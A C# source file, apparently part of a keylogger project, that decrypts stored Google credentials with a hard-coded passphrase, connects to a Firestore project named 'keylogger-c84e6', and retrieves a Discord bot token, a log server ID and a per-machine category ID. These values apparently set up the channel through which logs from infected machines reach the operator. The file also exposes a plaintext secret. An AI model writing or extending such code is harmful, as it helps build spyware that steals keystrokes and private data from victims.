using Google.Apis.Auth.OAuth2;
using Google.Cloud.Firestore;
using Google.Cloud.Firestore.V1;
using Grpc.Auth;

public class DiscordConfigService
{
    private readonly FirestoreDb _db;

    public DiscordConfigService(string projectId = "keylogger-c84e6", string encryptedJsonPath = "SystemH.enc", string passphrase = "#P!#c-HSFJt5R2w?ET")
    {
            string credentialJson = JsonCrypto.DecryptJsonFromFileAsync(encryptedJsonPath, passphrase).GetAwaiter().GetResult();

            GoogleCredential credential = GoogleCredential.FromJson(credentialJson);

            FirestoreClientBuilder builder = new FirestoreClientBuilder
            {
                ChannelCredentials = credential.ToChannelCredentials()
            };

            FirestoreClient client = builder.Build();
            _db = FirestoreDb.Create(projectId, client);
    }

    public class DiscordConfig
    {
        public string? Token { get; set; }
        public long LogGuildId { get; set; }
        public long MachineCategoryId { get; set; }
    }

    public async Task<DiscordConfig> GetDiscordConfigAsync()
    {
        DocumentReference docRef = _db.Collection("Discord").Document("IDs | Token");
        DocumentSnapshot snapshot = await docRef.GetSnapshotAsync();

        if (!snapshot.Exists)
            throw new Exception("Documento não encontrado no Firestore");

        var data = snapshot.ToDictionary();

        return new DiscordConfig
        {
            Token = data.ContainsKey("Token") ? data["Token"].ToString() : "",
            LogGuildId = data.ContainsKey("_logGuildId") ? Convert.ToInt64(data["_logGuildId"]) : 0,
            MachineCategoryId = data.ContainsKey("_machineCategoryId") ? Convert.ToInt64(data["_machineCategoryId"]) : 0
        };
    }

    public async Task<string> GetTokenAsync() => (await GetDiscordConfigAsync()).Token ?? "";
    public async Task<long> GetLogGuildIdAsync() => (await GetDiscordConfigAsync()).LogGuildId;
    public async Task<long> GetMachineCategoryIdAsync() => (await GetDiscordConfigAsync()).MachineCategoryId;
}